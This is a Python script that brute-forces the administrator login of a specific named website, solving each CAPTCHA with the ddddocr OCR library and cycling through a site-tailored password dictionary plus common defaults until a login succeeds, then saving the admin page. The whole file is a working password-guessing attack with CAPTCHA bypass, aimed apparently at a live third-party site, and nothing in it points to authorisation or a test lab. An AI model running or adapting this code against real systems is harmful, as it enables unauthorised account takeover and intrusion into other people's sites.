#!/usr/bin/env python3
"""zhongsheng mega dict + check other CN sites' login flows"""
import urllib.request, urllib.parse, re, http.cookiejar, base64, subprocess, sys, time

UA = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)", "Accept": "*/*"}
HOST = "http://zhongshengjinshuzhipin.com"
LOGIN_URL = "/index.php?g=admin&m=public&a=login"
CAP_URL = "/index.php?g=api&m=checkcode&a=index&length=4&font_size=20&width=248&height=42&use_noise=1&use_curve=0"

def get_opener():
    cj = http.cookiejar.CookieJar()
    return urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cj)), cj

def fetch(op, url, timeout=10, data=None, referer=None, raw=False):
    h = {**UA}
    if data: h["Content-Type"] = "application/x-www-form-urlencoded"
    if referer: h["Referer"] = referer
    try:
        req = urllib.request.Request(url, data=data.encode() if data else None, headers=h)
        r = op.open(req, timeout=timeout)
        body = r.read()
        return r.status, r.geturl(), (body if raw else body.decode("utf-8", "ignore"))
    except urllib.error.HTTPError as e:
        return e.code, url, (e.read(5000) if raw else e.read(5000).decode("utf-8", "ignore"))
    except Exception as ex:
        return 0, url, str(ex)

def ocr_img(img_bytes):
    b64 = base64.b64encode(img_bytes).decode()
    code = ("import ddddocr,base64; o=ddddocr.DdddOcr(show_ad=False); "
            "print(o.classification(base64.b64decode('%s')))" % b64)
    r = subprocess.run([sys.executable, "-c", code], capture_output=True, timeout=20, cwd="/tmp")
    return r.stdout.decode().strip()

# mega dict from pw_mega (site-relevant + top)
pws = []
try:
    for l in open("/opt/msray/pw_mega.txt"):
        p = l.strip()
        if len(p) <= 20 and any(k in p.lower() for k in ["zs", "zhong", "sheng", "admin", "123", "jinshu", "metal"]):
            pws.append(p)
        if len(pws) > 200:
            break
except Exception:
    pass
pws = list(dict.fromkeys(pws + ["admin", "admin123", "123456", "admin888", "zhongsheng", "zs123456"]))
print("dict: %d" % len(pws), flush=True)

op, cj = get_opener()
code, final, body = fetch(op, HOST + LOGIN_URL)
print("login page: %s" % code, flush=True)

for pw in pws:
    code, final, cap = fetch(op, HOST + CAP_URL, raw=True, referer=HOST + LOGIN_URL)
    if isinstance(cap, str) or len(cap) < 100:
        time.sleep(1)
        continue
    verify = ocr_img(cap)
    if not verify:
        continue
    data = urllib.parse.urlencode({"username": "admin", "password": pw, "verify": verify})
    code, final, body = fetch(op, HOST + LOGIN_URL, data=data, referer=HOST + LOGIN_URL)
    ok = ("g=admin&m=index" in final) or ("退出" in body)
    if ok:
        print("!!! HIT admin/%s" % pw, flush=True)
        open("/tmp/zs_hit.html", "w").write(body)
        break
    time.sleep(0.3)
else:
    print("[done] no hit (%d pws)" % len(pws), flush=True)
